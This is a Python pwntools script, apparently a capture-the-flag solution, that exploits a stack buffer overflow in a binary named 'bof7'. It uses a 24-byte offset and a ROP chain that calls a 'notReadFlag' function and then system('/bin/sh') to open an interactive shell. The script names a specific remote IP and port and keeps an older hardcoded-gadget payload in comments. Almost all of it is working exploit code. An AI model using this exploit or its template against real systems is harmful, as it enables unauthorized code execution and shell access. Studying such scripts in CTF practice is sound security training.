from pwn import *
from Crypto.Util.number import bytes_to_long

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './bof7'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = 24
not_read_flag = elf.symbols.notReadFlag
plt_system = elf.symbols.plt.system
binsh = elf.symbols.magic

rop = ROP(elf)
ret = rop.ret[0]
rop.raw(ret)
rop.raw(not_read_flag)
rop.raw(ret)
rop.system(next(elf.search(b"/bin/sh\x00")))


# Start program
io = start()
print(rop.dump())

# Build the payload
payload = flat({
    offset: [
        # not_read_flag,
        # pop_rdi,
        # binsh,
        # plt_system
        rop.chain()
    ]
})

# print(payload)
# f = open("payload.txt", "rb")
# f.write(payload)

# # # Send the payload
io.sendlineafter("input:", payload)

# # # Got Shell?
io.interactive()

host, port = '13.214.30.13', '10007'

# r = process('./bof7')

# r.recvuntil('your input: ')

# rflag = 0x00000000004011d6
# poprdi = 0x00401323
# system_plt = 0x00000000004010b0
# binsh = 0x404080
# ret = 0x00401150
# payload = 'A'*(16+8) + p64(ret) + p64(poprdi) + p64(binsh) + p64(system_plt)

# r.sendline(payload)

# r.interactive()
